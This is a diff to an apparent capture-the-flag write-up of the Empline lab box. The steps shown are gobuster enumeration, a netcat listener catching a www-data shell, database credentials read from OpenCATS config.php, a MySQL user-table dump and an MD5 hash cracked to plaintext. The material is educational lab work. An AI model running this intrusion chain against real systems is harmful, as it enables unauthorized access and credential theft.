@@ -11,7 +11,7 @@ During initial browsing, the website presents as a single-page application with 
 
 
 
-````
+```bash
 root@ip-10-201-9-244:~# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u job.empline.thm -t 50
 ===============================================================
 Gobuster v3.6
@@ -52,7 +52,7 @@ Progress: 207643 / 207644 (100.00%)
 Finished
 ===============================================================
 
-````
+```
 On the `/careers` page, we can browse open roles and click into a position to reach the application form. From there, the Apply view includes standard fields plus a file upload control for attaching a résumé or supporting documents, confirming the portal accepts user-supplied files during submission.
 
 
@@ -62,7 +62,7 @@ On the `/careers` page, we can browse open roles and click into a position to re
 
 Set up a listener, and we recieve a shell:
 
-````
+````bash
 root@ip-10-201-9-244:~# nc -nvlp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.201.34.121 33000
@@ -74,13 +74,39 @@ www-data@ip-10-201-34-121:/var/www/opencats/upload/careerportaladd$
 
 ````
 
-<img width="1136" height="484" alt="james pass" src="https://github.com/user-attachments/assets/566fa4d5-edc0-48c9-868b-eb8b0875873e" />
+Navigate to:
+
+```/var/www/opencats/config.php```
+
+```bash
+/* License key. */
+define('LICENSE_KEY','3163GQ-54ISGW-14E4SHD-ES9ICL-X02DTG-GYRSQ6');
+
+/* Database configuration. */
+define('DATABASE_USER', 'james');
+define('DATABASE_PASS', 'ng6pUFvsGNtw');
+define('DATABASE_HOST', 'localhost');
+define('DATABASE_NAME', 'opencats');
+
+/* Authentication Configuration
+ * Options are sql, ldap, sql+ldap
+ */
+define ('AUTH_MODE', 'sql');
+````
+
+With these credentials, we are able to use mysql
+
+```bash
+www-data@ip-10-201-34-121:/$ mysql -u james -p
+mysql -u james -p
+Enter password: ng6pUFvsGNtw
+````
 
 
 __________________________________________________________________________________________________________________________________________
 
 
-````
+````bash
 MariaDB [opencats]>  select user_name, email, password, access_level from user;
 < user_name, email, password, access_level from user;                        
 +----------------+----------------------+----------------------------------+--------------+
@@ -94,7 +120,10 @@ MariaDB [opencats]>  select user_name, email, password, access_level from user;
 4 rows in set (0.000 sec)
 
 ````
-Crackstation
-86d0dfda99dbebc424eb4407947356ac --> pretonnevippasempre
+### CrackStation Result
+
+| Algorithm | Hash                              | Plaintext           |
+|----------:|-----------------------------------|---------------------|
+| MD5       | 86d0dfda99dbebc424eb4407947356ac | pretonnevippasempre |
 
 
